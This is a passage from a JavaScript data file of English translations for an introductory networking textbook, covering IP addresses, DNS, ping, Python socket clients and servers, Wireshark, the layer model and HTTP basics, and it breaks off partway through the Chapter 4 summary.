/**
 * English translations for chapter content.
 * Structure: { [chapterId]: { titleEn, pages: [{ titleEn, contentEn? }] } }
 * Only pages with contentEn are translated; others fall back to Hebrew.
 * Simulations, thinkOutside, and questions pages don't need contentEn.
 *
 * Language level: A2–B1 (simple vocabulary, short sentences).
 */

export const contentEn = {

  // ========== CHAPTER 1 ==========
  1: {
    titleEn: "Starting the Journey — How Does the Internet Work?",
    pages: [
      {
        // Page 0: explanation
        titleEn: "What happens when we browse a website?",
        contentEn: `
          <p>Most of us have visited <code>Facebook</code>.</p>
          <p>But what actually happens behind the scenes?</p>
          <p>We type <code>www.facebook.com</code> in the browser, press Enter — and get the page.</p>
          <p><strong>A website needs four things to work:</strong></p>
          <ul>
            <li><strong>Storage</strong> — a place for the website files</li>
            <li><strong>Design</strong> — logo, layout of elements</li>
            <li><strong>Authentication</strong> — identifying users</li>
            <li><strong>Communication</strong> — a way to reach the website from anywhere in the world</li>
          </ul>
          <p>This book focuses on <strong>communication</strong>.</p>
          <p>We will learn how data moves between electronic devices.</p>
        `
      },
      {
        // Page 1: explanation — WWW
        titleEn: "WWW – World Wide Web",
        contentEn: `
          <p><strong>WWW</strong> — <code>World Wide Web</code></p>
          <p>When we say "the Internet," we usually mean the web pages we visit in a browser.</p>
          <p>The word <code>Web</code> means network — web pages are linked to each other like a spider's web.</p>
          <p><strong>Request</strong> — <code>Request</code></p>
          <p>The browser sends a request to the server — "send me the data I need."</p>
          <p><strong>Response</strong> — <code>Response</code></p>
          <p>The server replies with a response that contains the data.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 400 140" class="content-diagram">
              <rect x="30" y="20" width="90" height="60" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
              <text x="75" y="50" text-anchor="middle" font-size="12" fill="var(--text)">Client</text>
              <text x="75" y="65" text-anchor="middle" font-size="10" fill="var(--text-muted)">(Browser)</text>
              <path d="M 125 50 L 175 50" stroke="var(--accent-green)" stroke-width="2" marker-end="url(#arrow)"/>
              <text x="150" y="40" text-anchor="middle" font-size="9" fill="var(--accent-green)">Request</text>
              <path d="M 275 50 L 225 50" stroke="var(--accent-gold)" stroke-width="2" marker-end="url(#arrow2)"/>
              <text x="250" y="40" text-anchor="middle" font-size="9" fill="var(--accent-gold)">Response</text>
              <rect x="280" y="20" width="90" height="60" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
              <text x="325" y="50" text-anchor="middle" font-size="12" fill="var(--text)">Server</text>
              <text x="325" y="65" text-anchor="middle" font-size="10" fill="var(--text-muted)">(Website)</text>
              <defs><marker id="arrow" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-green)"/></marker>
              <marker id="arrow2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-gold)"/></marker></defs>
            </svg>
            <p class="diagram-caption">Diagram: Client-Server communication</p>
          </div>
          <p>The website receives requests and sends responses — it provides a service.</p>
          <p><strong>Server</strong> — The website is the server.</p>
          <p><strong>Client</strong> — The browser is the client.</p>
        `
      },
      {
        // Page 2: demo — what the server sends
        titleEn: "Demo: What the Server Sends to the Client",
        contentEn: `
          <p>When you choose <code>View page source</code> on a website, you see the code the server sent.</p>
          <p><strong>Example:</strong> This is what the server returns:</p>
          <div class="code-preview">
            <pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
  &lt;title&gt;Main Page - News Site&lt;/title&gt;
  &lt;meta charset="UTF-8"&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;Main Heading of the Page&lt;/h1&gt;
  &lt;p&gt;Text shown to the user...&lt;/p&gt;
  &lt;img src="/images/photo.jpg" alt="Photo"&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
          </div>
          <ul>
            <li><code>HTML</code> — the language of web pages</li>
            <li><code>&lt;h1&gt;</code> — heading</li>
            <li><code>&lt;p&gt;</code> — paragraph (text)</li>
            <li><code>&lt;img&gt;</code> — image</li>
          </ul>
          <p>The browser reads this code and shows you a nice page with colors, images, and text.</p>
          <p>This is what happens every time you open a website.</p>
        `
      },
      {
        // Page 3: explanation — IP Addresses
        titleEn: "IP Addresses",
        contentEn: `
          <p>To send and receive messages on the Internet, you need to know where to send them.</p>
          <p>Like a letter — you write a destination address and a return address on the envelope.</p>
          <p><strong>IP Addresses</strong></p>
          <p>On the Internet, addresses are called <code>IP</code> addresses.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 70" class="content-diagram">
              <rect x="10" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="40" text-anchor="middle" font-size="12" fill="var(--text)">Byte 1</text>
              <text x="45" y="55" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <text x="88" y="40" text-anchor="middle" font-size="16" fill="var(--text-muted)">.</text>
              <rect x="95" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="130" y="40" text-anchor="middle" font-size="12" fill="var(--text)">Byte 2</text>
              <text x="130" y="55" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <text x="173" y="40" text-anchor="middle" font-size="16" fill="var(--text-muted)">.</text>
              <rect x="180" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="215" y="40" text-anchor="middle" font-size="12" fill="var(--text)">Byte 3</text>
              <text x="215" y="55" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <text x="258" y="40" text-anchor="middle" font-size="16" fill="var(--text-muted)">.</text>
              <rect x="265" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="300" y="40" text-anchor="middle" font-size="12" fill="var(--text)">Byte 4</text>
              <text x="300" y="55" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
            </svg>
            <p class="diagram-caption">An IP address has 4 bytes (numbers 0–255)</p>
          </div>
          <p>Example: <code>192.168.1.1</code></p>
          <p>Each number is between 0 and 255. This is called <code>IPv4</code>.</p>
          <p><strong>Port</strong> — a number that tells which program on the computer should get the message.</p>
          <p>Think of the IP address as a building address, and the port as the apartment number.</p>
          <p>Example: <code>192.168.1.1:443</code> — IP address <code>192.168.1.1</code>, port <code>443</code> (HTTPS).</p>
        `
      },
      {
        // Page 4: demo — ping output
        titleEn: "Demo: Output of the ping Command",
        contentEn: `
          <p>When you run <code>ping www.facebook.com</code>, this output appears:</p>
          <div class="code-preview">
            <pre><code>C:&gt; ping www.facebook.com

Pinging facebook.com [31.13.72.65] with 32 bytes of data:
Reply from 31.13.72.65: bytes=32 time=45ms TTL=56
Reply from 31.13.72.65: bytes=32 time=42ms TTL=56</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>In the line <code>Pinging facebook.com [31.13.72.65]</code> — the number in brackets is the IP address of Facebook's server.</li>
              <li><code>time=45ms</code> — it took 45 milliseconds for the message to go and come back.</li>
              <li><code>TTL=56</code> — Time To Live. The message can pass through up to 56 more routers before it is dropped.</li>
            </ul>
          </div>
          <p><strong>What is <code>ping</code>?</strong></p>
          <p>A command that sends a small message to a server and waits for a reply.</p>
          <ul>
            <li>If you get a reply — the connection works.</li>
            <li>If there is no reply — something is wrong (the server is down, or you are not connected).</li>
          </ul>
        `
      },
      {
        // Page 5: explanation — The Internet Cloud
        titleEn: "The Internet Cloud",
        contentEn: `
          <p>Our computer is not connected directly to <code>Facebook</code>.</p>
          <p>It connects to a device that finds its way to other devices — a network of devices that pass the message from our computer all the way to the destination server.</p>
          <p>Each arrow between devices represents a link (data link layer communication).</p>
        `
      },
      {
        // Page 6: explanation — traceroute
        titleEn: "traceroute — The Path of a Message",
        contentEn: `
          <p><strong><code>traceroute</code></strong></p>
          <p>A tool that shows the path a message takes from our computer to the destination.</p>
          <p>Each line in the output is one device — a router or server — that the packet passed through.</p>
          <p>Each step is called a <code>hop</code>.</p>
          <p>Visual tool: <code>Visual Traceroute</code> on <a href="http://yougetsignal.com/tools/visual-tracert" target="_blank">yougetsignal.com</a>.</p>
          <p>It shows the route on a world map.</p>
        `
      },
      {
        // Page 7: explanation — DNS
        titleEn: "DNS — Translates Names to IP Addresses",
        contentEn: `
          <p><strong><code>DNS</code></strong> — <code>Domain Name System</code></p>
          <p>A system that translates domain names to <code>IP</code> addresses.</p>
          <p>Example: the name <code>www.facebook.com</code> is translated to a numeric <code>IP</code> address.</p>
          <p>The command <code>nslookup www.facebook.com</code> sends a <code>DNS</code> query and shows the <code>IP</code> address.</p>
        `
      },
      {}, // Page 8: simulation — skip
      {}, // Page 9: simulation — skip
      {
        // Page 10: explanation — GeoIP
        titleEn: "GeoIP — Geographic Location",
        contentEn: `
          <p><strong><code>GeoIP</code></strong> — Geographic location by <code>IP</code> address</p>
          <p>There are databases that contain location information for <code>IP</code> addresses.</p>
          <p>Given an <code>IP</code> address, you can find out which country and city it belongs to.</p>
          <p>The mapping is not official and not exact, but it gives the right answer in most cases.</p>
          <p><strong>Example:</strong> <a href="http://www.geoiptool.com" target="_blank">geoiptool.com</a></p>
          <p>Try it: visit <a href="http://www.geoiptool.com" target="_blank">geoiptool.com</a> to see your own location.</p>
        `
      },
      {}, // Page 11: thinkOutside — skip
      {
        // Page 12: summary
        titleEn: "Chapter 1 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>Client-Server model: the browser sends a request, the server returns a response</li>
              <li><code>IP</code> addresses identify computers — 4 bytes, each 0–255</li>
              <li><code>ping</code> — checks the connection, finds the <code>IP</code>. <code>traceroute</code> — shows the path of packets</li>
              <li><code>DNS</code> translates a domain name — <code>www.facebook.com</code> — to an <code>IP</code>. <code>nslookup</code> — sends a <code>DNS</code> query</li>
              <li>A port is a number that identifies which service on a computer receives the message</li>
            </ul>
          </div>
        `
      },
      {
        // Page 13: demo — nslookup
        titleEn: "Demo: Output of nslookup",
        contentEn: `
          <p>When you run <code>nslookup www.google.com</code>, this is the output:</p>
          <div class="code-preview">
            <pre><code>C:&gt; nslookup www.google.com

Non-authoritative answer:
Name:    www.google.com
Addresses:  142.250.185.46
            2a00:1450:4010:c08::8b</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>The first address is <code>IPv4</code>, the second is <code>IPv6</code></li>
              <li><code>Non-authoritative</code> means the answer came from a cache, not the main DNS server</li>
              <li>Try it yourself: open the terminal and type <code>nslookup</code> followed by any website name</li>
            </ul>
          </div>
        `
      },
      {}, // Page 14: questions — skip
    ]
  },

  // ========== CHAPTER 2 ==========
  2: {
    titleEn: "Socket Programming",
    pages: [
      {
        // Page 0: explanation
        titleEn: "What is a Socket?",
        contentEn: `
          <p>A <strong>socket</strong> is an interface for communication between computers.</p>
          <p>Think of it as a "door" that lets programs send and receive data over the network.</p>
          <p><strong>To open a socket, you need two things:</strong></p>
          <ul>
            <li><strong>IP address</strong> — the address of the computer you want to talk to</li>
            <li><strong>Port number</strong> — which program on that computer should receive the message</li>
          </ul>
          <p>A socket connects two programs: one on your computer, and one on the remote computer.</p>
          <p>Once the socket is open, both sides can send and receive data.</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "Client-Server Model with Sockets",
        contentEn: `
          <p>Socket communication uses the <strong>Client-Server</strong> model:</p>
          <ul>
            <li><strong>Server</strong> — waits for connections. It listens on a specific port.</li>
            <li><strong>Client</strong> — starts the connection. It connects to the server's IP and port.</li>
          </ul>
          <p><strong>Analogy:</strong></p>
          <ul>
            <li>The <strong>IP address</strong> is like a building address</li>
            <li>The <strong>port</strong> is like an apartment number in that building</li>
          </ul>
          <p>Port numbers go from <code>0</code> to <code>65535</code>.</p>
          <p>Some ports are reserved: <code>80</code> for HTTP, <code>443</code> for HTTPS, <code>22</code> for SSH.</p>
          <p>When you write a socket program, you choose a port number (usually above 1024).</p>
        `
      },
      {
        // Page 2: demo
        titleEn: "Client Code in Python",
        contentEn: `
          <p>Here is a simple client that connects to a server and sends a message:</p>
          <div class="code-preview">
            <pre><code>import socket

my_socket = socket.socket()
my_socket.connect(("127.0.0.1", 8820))

my_socket.send("Hello server!".encode())
data = my_socket.recv(1024)
print("Server said:", data.decode())

my_socket.close()</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>socket.socket()</code> — creates a new socket</li>
              <li><code>.connect((IP, port))</code> — connects to the server</li>
              <li><code>.send()</code> — sends data (must be bytes, so we use <code>.encode()</code>)</li>
              <li><code>.recv(1024)</code> — receives up to 1024 bytes from the server</li>
              <li><code>.close()</code> — closes the connection</li>
            </ul>
          </div>
        `
      },
      {
        // Page 3: demo
        titleEn: "Server Code in Python",
        contentEn: `
          <p>Here is a simple server that waits for a client:</p>
          <div class="code-preview">
            <pre><code>import socket

server_socket = socket.socket()
server_socket.bind(("0.0.0.0", 8820))
server_socket.listen()

print("Waiting for a client...")
client_socket, address = server_socket.accept()
print("Client connected:", address)

data = client_socket.recv(1024)
print("Client said:", data.decode())
client_socket.send("Hello client!".encode())

client_socket.close()
server_socket.close()</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>.bind((IP, port))</code> — tells the OS: "I want to listen on this address and port"</li>
              <li><code>.listen()</code> — starts listening for connections</li>
              <li><code>.accept()</code> — waits until a client connects. Returns the client socket and its address</li>
              <li>After <code>accept()</code>, the server can send and receive data with the client</li>
            </ul>
          </div>
        `
      },
      {
        // Page 4: explanation
        titleEn: "Echo Server and Command Server",
        contentEn: `
          <p><strong>Echo Server</strong></p>
          <p>The simplest server: it receives a message and sends back the same message.</p>
          <ul>
            <li>Client sends: <code>"Hello"</code></li>
            <li>Server returns: <code>"Hello"</code></li>
          </ul>
          <p>This is useful for testing that the connection works.</p>
          <p><strong>Command Server</strong></p>
          <p>A more advanced server: it reads the message, understands it as a command, and sends back a result.</p>
          <ul>
            <li>Client sends: <code>"TIME"</code> → Server returns the current time</li>
            <li>Client sends: <code>"NAME"</code> → Server returns the server name</li>
            <li>Client sends: <code>"EXIT"</code> → Server closes the connection</li>
          </ul>
          <p>The server uses <code>if/elif</code> to check which command was received.</p>
        `
      },
      {
        // Page 5: summary
        titleEn: "Chapter 2 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>A <strong>socket</strong> is an interface for network communication between two programs</li>
              <li>You need an <strong>IP address</strong> and a <strong>port number</strong> to create a connection</li>
              <li><strong>Client</strong>: <code>connect()</code> → <code>send()</code> → <code>recv()</code> → <code>close()</code></li>
              <li><strong>Server</strong>: <code>bind()</code> → <code>listen()</code> → <code>accept()</code> → <code>recv()</code>/<code>send()</code> → <code>close()</code></li>
              <li>Data must be sent as <strong>bytes</strong> — use <code>.encode()</code> and <code>.decode()</code></li>
              <li>An <strong>echo server</strong> returns the same message. A <strong>command server</strong> processes commands.</li>
            </ul>
          </div>
        `
      },
      {
        // Page 6: explanation
        titleEn: "127.0.0.1 and 0.0.0.0",
        contentEn: `
          <p><strong><code>127.0.0.1</code> — Loopback</strong></p>
          <ul>
            <li>This IP address always means "this computer"</li>
            <li>When you connect to <code>127.0.0.1</code>, you connect to yourself</li>
            <li>Also called <code>localhost</code></li>
            <li>Used for testing: run the server and client on the same computer</li>
          </ul>
          <p><strong><code>0.0.0.0</code> — All Interfaces</strong></p>
          <ul>
            <li>When a server binds to <code>0.0.0.0</code>, it listens on all network interfaces</li>
            <li>This means any computer on the network can connect to it</li>
            <li>If you bind to <code>127.0.0.1</code>, only your own computer can connect</li>
            <li>If you bind to <code>0.0.0.0</code>, other computers can connect too</li>
          </ul>
        `
      },
      {}, // Page 7: questions — skip
    ]
  },

  // ========== CHAPTER 3 ==========
  3: {
    titleEn: "Wireshark and the Five-Layer Model",
    pages: [
      {
        // Page 0: explanation
        titleEn: "What Happens When We Communicate?",
        contentEn: `
          <p>When two computers communicate, data travels through the network.</p>
          <p>But we cannot see this data with our eyes.</p>
          <p><strong>Wireshark</strong> is a tool that lets you see all network traffic on your computer.</p>
          <ul>
            <li>It captures every packet that enters or leaves your computer</li>
            <li>It shows the details of each packet: source, destination, protocol, and data</li>
            <li>It is free and works on Windows, Mac, and Linux</li>
          </ul>
          <p>With Wireshark, we can understand what really happens when we browse a website, send an email, or use any network application.</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "Why Do We Need a Layer Model?",
        contentEn: `
          <p>Network communication is very complex. Many things happen at the same time:</p>
          <ul>
            <li>Finding the destination address</li>
            <li>Breaking data into small pieces</li>
            <li>Sending electrical signals on a wire</li>
            <li>Making sure data arrives correctly</li>
          </ul>
          <p>To organize this complexity, the <strong>ISO</strong> organization created a model with layers.</p>
          <p>Each layer has one job. Each layer uses the services of the layer below it.</p>
          <p>This is called the <strong>OSI model</strong> (Open Systems Interconnection).</p>
          <p>We will learn a simpler version: the <strong>Five-Layer Model</strong>.</p>
        `
      },
      {
        // Page 2: demo (analogy)
        titleEn: "Analogy — Flying at an Airport",
        contentEn: `
          <p>Think about flying from one country to another. There are steps:</p>
          <ul>
            <li><strong>Layer 5 (Application)</strong> — You decide to travel and buy a ticket</li>
            <li><strong>Layer 4 (Transport)</strong> — You pack your luggage and check in</li>
            <li><strong>Layer 3 (Network)</strong> — The airport system finds the best route for your flight</li>
            <li><strong>Layer 2 (Data Link)</strong> — You walk through the gate to your specific plane</li>
            <li><strong>Layer 1 (Physical)</strong> — The plane flies through the air</li>
          </ul>
          <p>When you land:</p>
          <ul>
            <li>You leave the plane (Layer 1)</li>
            <li>You walk through the gate (Layer 2)</li>
            <li>You arrive at the destination airport (Layer 3)</li>
            <li>You collect your luggage (Layer 4)</li>
            <li>You reached your destination (Layer 5)</li>
          </ul>
          <p>Each layer does its job without knowing the details of the other layers.</p>
        `
      },
      {
        // Page 3: explanation
        titleEn: "Five-Layer Model — Overview",
        contentEn: `
          <p>The five layers from top to bottom:</p>
          <ul>
            <li><strong>Layer 5 — Application</strong>: The program that sends or receives data (browser, email client)</li>
            <li><strong>Layer 4 — Transport</strong>: Makes sure data arrives correctly. Uses TCP or UDP</li>
            <li><strong>Layer 3 — Network</strong>: Finds the path from source to destination. Uses IP addresses</li>
            <li><strong>Layer 2 — Data Link</strong>: Moves data between two directly connected devices. Uses MAC addresses</li>
            <li><strong>Layer 1 — Physical</strong>: The actual wires, radio waves, or light signals that carry the data</li>
          </ul>
          <p>Data flows <strong>down</strong> the layers when sending, and <strong>up</strong> the layers when receiving.</p>
        `
      },
      {
        // Page 4: explanation
        titleEn: "Protocol — Definition",
        contentEn: `
          <p>A <strong>protocol</strong> is a set of rules for communication.</p>
          <p>Like a language: if two people want to talk, they must use the same language.</p>
          <p>In networks, both sides must follow the same protocol to understand each other.</p>
          <p><strong>Examples of protocols:</strong></p>
          <ul>
            <li><code>HTTP</code> — for web pages (Layer 5)</li>
            <li><code>TCP</code> — for reliable data transfer (Layer 4)</li>
            <li><code>UDP</code> — for fast data transfer, no guarantee (Layer 4)</li>
            <li><code>IP</code> — for addressing and routing (Layer 3)</li>
            <li><code>Ethernet</code> — for local network connections (Layer 2)</li>
          </ul>
          <p>Each layer has its own protocols.</p>
        `
      },
      {
        // Page 5: explanation
        titleEn: "Encapsulation and Decapsulation",
        contentEn: `
          <p><strong>Encapsulation</strong> — when sending data:</p>
          <ul>
            <li>Each layer adds its own <strong>header</strong> to the data</li>
            <li>The header contains information that layer needs (like addresses)</li>
            <li>The data goes down: Application → Transport → Network → Data Link → Physical</li>
          </ul>
          <p><strong>Decapsulation</strong> — when receiving data:</p>
          <ul>
            <li>Each layer removes its header and reads the information</li>
            <li>The data goes up: Physical → Data Link → Network → Transport → Application</li>
          </ul>
          <p>Think of it like putting a letter in an envelope, then in a box, then in a shipping container. On the other side, you unpack in reverse order.</p>
        `
      },
      {}, // Page 6: simulation — skip
      {
        // Page 7: explanation
        titleEn: "Packet Structure — Each Layer Adds a Header",
        contentEn: `
          <p>A packet on the network looks like this (from outside to inside):</p>
          <ul>
            <li><strong>Ethernet Header</strong> (Layer 2) — source and destination MAC addresses</li>
            <li><strong>IP Header</strong> (Layer 3) — source and destination IP addresses</li>
            <li><strong>TCP/UDP Header</strong> (Layer 4) — source and destination ports</li>
            <li><strong>Data</strong> (Layer 5) — the actual message (for example, an HTTP request)</li>
          </ul>
          <p>In Wireshark, you can click on each layer and see its header fields.</p>
          <p>The headers are like labels on a package: each delivery person reads the label they need.</p>
        `
      },
      {
        // Page 8: explanation
        titleEn: "Each Layer in Detail — Services",
        contentEn: `
          <p>What does each layer do?</p>
          <ul>
            <li><strong>Physical</strong> — converts data to electrical signals, light, or radio waves. Defines cables and connectors.</li>
            <li><strong>Data Link</strong> — sends data between two devices on the same network. Detects errors. Uses MAC addresses.</li>
            <li><strong>Network</strong> — routes data across different networks. Uses IP addresses. Handles routing.</li>
            <li><strong>Transport</strong> — provides reliable (TCP) or fast (UDP) delivery. Manages ports and connections.</li>
            <li><strong>Application</strong> — the protocols that applications use directly: HTTP, DNS, FTP, SMTP.</li>
          </ul>
        `
      },
      {
        // Page 9: summary
        titleEn: "Chapter 3 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li><strong>Wireshark</strong> captures and displays network packets in real time</li>
              <li>The <strong>Five-Layer Model</strong> organizes network communication into layers</li>
              <li>Layers (top to bottom): Application, Transport, Network, Data Link, Physical</li>
              <li>A <strong>protocol</strong> is a set of rules both sides must follow</li>
              <li><strong>Encapsulation</strong>: each layer adds a header when sending</li>
              <li><strong>Decapsulation</strong>: each layer removes its header when receiving</li>
              <li>Each layer provides services to the layer above it</li>
            </ul>
          </div>
        `
      },
      {
        // Page 10: demo
        titleEn: "Using Wireshark",
        contentEn: `
          <p><strong>How to use Wireshark:</strong></p>
          <ul>
            <li><strong>Start capture</strong> — choose a network interface (Wi-Fi or Ethernet) and click the blue shark fin</li>
            <li><strong>Filter packets</strong> — type a filter in the filter bar:
              <ul>
                <li><code>http</code> — show only HTTP traffic</li>
                <li><code>tcp</code> — show only TCP packets</li>
                <li><code>ip.addr == 192.168.1.1</code> — show only packets to/from this IP</li>
                <li><code>tcp.port == 80</code> — show only traffic on port 80</li>
              </ul>
            </li>
            <li><strong>Analyze</strong> — click on a packet to see its details. Each layer is shown as a collapsible section.</li>
          </ul>
          <p>Wireshark uses colors to show different types of traffic (green for TCP, blue for DNS, etc.).</p>
        `
      },
      {}, // Page 11: questions — skip
    ]
  },

  // ========== CHAPTER 4 ==========
  4: {
    titleEn: "The Application Layer",
    pages: [
      {
        // Page 0: explanation
        titleEn: "What is the Application Layer?",
        contentEn: `
          <p>The <strong>Application Layer</strong> is Layer 5 — the top layer of the model.</p>
          <p>This is the layer that programs use directly.</p>
          <ul>
            <li>Your browser uses <code>HTTP</code> to get web pages</li>
            <li>Your email app uses <code>SMTP</code> to send emails</li>
            <li>Your computer uses <code>DNS</code> to convert domain names to IP addresses</li>
          </ul>
          <p>The Application Layer defines the format of messages between programs.</p>
          <p>It does not care how the data travels — that is the job of the lower layers.</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "HTTP Protocol — Request and Response",
        contentEn: `
          <p><strong>HTTP</strong> — <code>HyperText Transfer Protocol</code></p>
          <p>The main protocol for the web. Your browser uses it every time you visit a website.</p>
          <p><strong>How it works:</strong></p>
          <ul>
            <li>The client (browser) sends an <strong>HTTP Request</strong></li>
            <li>The server processes the request</li>
            <li>The server sends back an <strong>HTTP Response</strong></li>
          </ul>
          <p>This is called <strong>Request-Response</strong> — the client always starts, the server always replies.</p>
          <p>Each request asks for a specific resource (a page, an image, a file).</p>
        `
      },
      {
        // Page 2: explanation
        titleEn: "HTTP Structure — Lines and Headers",
        contentEn: `
          <p>An HTTP message has a specific format:</p>
          <ul>
            <li><strong>Request line</strong> — the method, path, and HTTP version: <code>GET /index.html HTTP/1.1</code></li>
            <li><strong>Headers</strong> — extra information, one per line: <code>Host: www.example.com</code></li>
            <li><strong>Empty line</strong> — separates headers from the body</li>
            <li><strong>Body</strong> — the data (optional, used in POST requests)</li>
          </ul>
          <p>Lines are separated by <code>CRLF</code> (Carriage Return + Line Feed: <code>\\r\\n</code>).</p>
          <p><strong>Common headers:</strong></p>
          <ul>
            <li><code>Host</code> — the domain name of the server</li>
            <li><code>Content-Type</code> — the type of data (text/html, application/json)</li>
            <li><code>Content-Length</code> — the size of the body in bytes</li>
          </ul>
        `
      },
      {
        // Page 3: demo
        titleEn: "Using telnet for HTTP Requests",
        contentEn: `
          <p>You can send HTTP requests manually with <code>telnet</code>:</p>
          <div class="code-preview">
            <pre><code>telnet www.example.com 80

GET / HTTP/1.1
Host: www.example.com
</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>telnet</code> opens a raw TCP connection to the server on port 80</li>
              <li>You type the HTTP request by hand</li>
              <li>The server sends back the HTTP response with headers and HTML</li>
              <li>This shows that HTTP is just text sent over a TCP connection</li>
            </ul>
          </div>
          <p>This is a great way to understand what the browser does behind the scenes.</p>
        `
      },
      {
        // Page 4: demo
        titleEn: "Simple HTTP Server in Python",
        contentEn: `
          <p>You can write a basic HTTP server in Python:</p>
          <div class="code-preview">
            <pre><code>import socket

server = socket.socket()
server.bind(("0.0.0.0", 80))
server.listen()

client, addr = server.accept()
request = client.recv(1024).decode()
print(request)

response = "HTTP/1.1 200 OK\\r\\n"
response += "Content-Type: text/html\\r\\n"
response += "\\r\\n"
response += "&lt;h1&gt;Hello World!&lt;/h1&gt;"

client.send(response.encode())
client.close()
server.close()</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>The server listens on port 80 (HTTP)</li>
              <li>It reads the request from the browser</li>
              <li>It sends back a valid HTTP response: status line + headers + empty line + body</li>
              <li>Open <code>http://127.0.0.1</code> in your browser to see the result</li>
            </ul>
          </div>
        `
      },
      {
        // Page 5: explanation
        titleEn: "HTTP Status Codes",
        contentEn: `
          <p>Every HTTP response starts with a <strong>status code</strong>. It tells the client what happened.</p>
          <p><strong>Common status codes:</strong></p>
          <ul>
            <li><code>200 OK</code> — the request was successful</li>
            <li><code>301 Moved Permanently</code> — the page moved to a new URL</li>
            <li><code>404 Not Found</code> — the page does not exist</li>
            <li><code>500 Internal Server Error</code> — something went wrong on the server</li>
          </ul>
          <p><strong>Status code groups:</strong></p>
          <ul>
            <li><code>2xx</code> — Success</li>
            <li><code>3xx</code> — Redirect (go to a different URL)</li>
            <li><code>4xx</code> — Client error (you made a mistake)</li>
            <li><code>5xx</code> — Server error (the server has a problem)</li>
          </ul>
        `
      },
      {
        // Page 6: explanation
        titleEn: "DNS Protocol",
        contentEn: `
          <p><strong>DNS</strong> — <code>Domain Name System</code></p>
          <p>DNS converts domain names to IP addresses.</p>
          <p>When you type <code>www.google.com</code>, your computer asks a DNS server: "What is the IP address of this name?"</p>
          <p><strong>How DNS works:</strong></p>
          <ul>
            <li>Your computer sends a <strong>DNS query</strong> to a DNS server</li>
            <li>The DNS server looks up the name and returns the IP address</li>
            <li>Your computer uses the IP address to connect to the website</li>
          </ul>
          <p>DNS uses <strong>port 53</strong> and can use both UDP and TCP.</p>
          <p>Without DNS, you would need to remember IP addresses for every website.</p>
        `
      },
      {
        // Page 7: explanation
        titleEn: "GET and POST Requests",
        contentEn: `
          <p>HTTP has different <strong>methods</strong> (types of requests):</p>
          <p><strong>GET</strong></p>
          <ul>
            <li>Asks the server to send data</li>
            <li>Parameters are in the URL: <code>/search?q=hello</code></li>
            <li>Used when you open a page or click a link</li>
            <li>Should not change data on the server</li>
          </ul>
          <p><strong>POST</strong></p>
          <ul>
            <li>Sends data to the server</li>
            <li>Parameters are in the body (not visible in the URL)</li>
            <li>Used when you submit a form (login, register, upload)</li>
            <li>Can change data on the server</li>
          </ul>
          <p><strong>Key difference:</strong> GET is for reading, POST is for writing.</p>
        `
      },
      {
        // Page 8: explanation
        titleEn: "URL Structure",
        contentEn: `
          <p>A <strong>URL</strong> (Uniform Resource Locator) is the full address of a resource on the web.</p>
          <p><strong>Structure:</strong></p>
          <div class="code-preview">
            <pre><code>scheme://host:port/path?query</code></pre>
          </div>
          <ul>
            <li><code>scheme</code> — the protocol: <code>http</code> or <code>https</code></li>
            <li><code>host</code> — the domain name or IP: <code>www.example.com</code></li>
            <li><code>port</code> — optional, default is 80 (HTTP) or 443 (HTTPS)</li>
            <li><code>path</code> — the location on the server: <code>/images/photo.jpg</code></li>
            <li><code>query</code> — parameters: <code>?name=John&age=25</code></li>
          </ul>
          <p><strong>Example:</strong></p>
          <p><code>https://www.google.com:443/search?q=hello</code></p>
        `
      },
      {
        // Page 9: explanation
        titleEn: "Google Maps — Example of Network Resources",
        contentEn: `
          <p>Google Maps is a good example of how the web uses network resources.</p>
          <p>When you search for a place on Google Maps:</p>
          <ul>
            <li>Your browser sends an HTTP request with the search query</li>
            <li>The server returns map data in JSON format</li>
            <li>The browser downloads map images (tiles) from a CDN</li>
            <li>JavaScript code in the browser puts everything together</li>
          </ul>
          <p>One page can make <strong>dozens of HTTP requests</strong> to different servers.</p>
          <p>Each request uses a full URL to identify the resource.</p>
          <p>You can see all these requests in the browser's Developer Tools (F12 → Network tab).</p>
        `
      },
      {
        // Page 10: summary
        titleEn: "Chapter 4 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>The <strong>Application Layer</strong> is where programs communicate using protocols like HTTP and DNS</li>
              <li><strong>HTTP</strong> uses Request-Response: the client asks, the server answers</li>
              <li>HTTP messages have: request/status line, headers, empty line, and body</li>
              <li><strong>Status codes</strong>: 200 = OK, 404 = Not Found, 500 = Server Error</li>
